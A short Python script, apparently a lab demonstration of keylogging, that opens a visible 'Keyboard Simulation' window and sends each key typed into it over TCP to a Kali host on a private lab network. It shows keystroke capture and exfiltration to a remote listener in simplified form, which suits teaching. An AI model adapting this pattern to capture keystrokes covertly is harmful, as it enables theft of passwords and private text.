
import socket
import tkinter as tk

KALI_IP = "192.168.56.101"  
PORT = 5000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect((KALI_IP, PORT))
    print("Connected to Kali successfully.")

except ConnectionError:
    print("Could not connect to Kali.")
    raise SystemExit


def on_key(event):
    if event.keysym == "Escape":
        sock.close()
        root.destroy()
        return "break"

    if event.char and event.char.isprintable():
        message = event.char

    elif event.keysym == "space":
        message = " "

    elif event.keysym == "Return":
        message = "\n"

    else:
        return

    try:
        sock.sendall(message.encode("utf-8"))
    except OSError:
        root.destroy()


root = tk.Tk()
root.title("Keyboard Simulation")
root.geometry("450x220")

label = tk.Label(
    root,
    text="Type something"
)

label.pack(pady=20)

entry = tk.Entry(root, width=45, font=("Arial", 14))
entry.pack(pady=15)

entry.bind("<KeyPress>", on_key)
entry.focus_set()

root.mainloop()
